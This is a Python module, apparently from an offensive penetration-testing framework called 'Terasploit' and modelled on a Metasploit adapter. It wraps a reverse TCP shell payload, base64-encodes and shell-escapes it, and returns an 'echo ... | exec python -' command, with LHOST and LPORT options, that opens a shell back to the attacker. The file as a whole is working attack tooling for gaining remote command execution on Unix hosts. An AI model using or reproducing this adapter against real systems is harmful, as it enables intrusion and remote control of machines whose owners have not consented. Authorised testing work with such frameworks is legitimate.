"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/adapters/cmd/unix/python.py
"""

import importlib
import shlex

from teralibs.tsf.base.payload import ADAPTER, ARCH_CMD, PLATFORM_LINUX, PLATFORM_UNIX, Payload
from teralibs.tsf.core.payload.python.python_base import create_exec_stub


class TerasploitModule(Payload):
    """
    cmd/unix adapter that executes a Python payload via echo | python.

    The adapter delegates raw payload generation to the wrapped Python
    single, optionally re-encodes it to remove newlines, shell-escapes
    the result, and returns a ready-to-execute Unix command string.
    """

    NAME = "Python Exec (cmd/unix)"
    DESCRIPTION = (
        "Execute a Python payload from a Unix shell command.  "
        "The wrapped Python single is delivered via "
        "'echo <payload> | exec $(which python || which python3 || which python2) -'."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.0"
    RANK = "normal"
    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/adapters/cmd/unix/python.rb"
    ]

    PAYLOAD_TYPE = ADAPTER
    HANDLER = "reverse_tcp"  # inherits transport from wrapped single

    WRAPPED_PAYLOAD = "modules.payload.singles.generic.shell_reverse_tcp"

    ARCH = [ARCH_CMD]
    PLATFORM = [PLATFORM_UNIX, PLATFORM_LINUX]

    OPTIONS = ["LHOST", "LPORT", "BADCHARS"]

    # Compatibility guard

    def compatible(self, cached_size):
        """Return False when the wrapped payload is too large for echo(1)."""
        return not cached_size >= 120_000

    def generate(self, ctx):
        """Build the echo … | exec python - command string."""
        ctx.info(f"Adapter: loading wrapped Python single from {self.WRAPPED_PAYLOAD!r}...")

        try:
            mod = importlib.import_module(self.WRAPPED_PAYLOAD)
            single = mod.TerasploitModule()
        except (ImportError, AttributeError) as exc:
            ctx.error(f"Adapter: failed to load wrapped payload: {exc}")
            return b""

        ctx.info(f"Adapter: delegating generation to '{single.NAME}'...")
        raw = single.generate(ctx)

        if not raw:
            ctx.error("Adapter: wrapped single returned empty payload.")
            return b""

        if not self.compatible(len(raw)):
            ctx.error(
                f"Adapter: wrapped payload is {len(raw)} bytes - exceeds the "
                f"{120_000}-byte echo(1) argument limit.  Choose a "
                f"smaller Python single."
            )
            return b""

        try:
            python_source = raw.decode("utf-8")
        except UnicodeDecodeError:
            ctx.error("Adapter: wrapped payload is not valid UTF-8 Python source.")
            return b""

        if "\n" in python_source:
            ctx.info("Adapter: payload contains newlines - wrapping in base64-exec stub.")
            python_source = create_exec_stub(python_source)

        escaped = shlex.quote(python_source)
        command = f"echo {escaped} | exec $(which python || which python3 || which python2) -"

        ctx.info(f"Adapter: command length = {len(command)} bytes.")
        return command.encode("utf-8")
